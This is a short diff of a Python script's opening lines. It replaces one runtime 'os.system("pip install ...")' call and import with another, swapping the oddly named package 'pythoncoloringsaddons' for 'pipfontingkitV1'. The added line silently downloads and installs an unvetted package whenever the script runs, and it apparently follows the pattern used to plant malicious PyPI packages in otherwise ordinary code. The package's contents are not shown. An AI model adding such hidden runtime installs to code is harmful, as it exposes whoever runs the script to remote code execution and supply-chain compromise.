@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncoloringsaddons")
-import pythoncoloringsaddons
+os.system("pip install pipfontingkitV1")
+import pipfontingkitV1
 import json
 import httpx
 import time
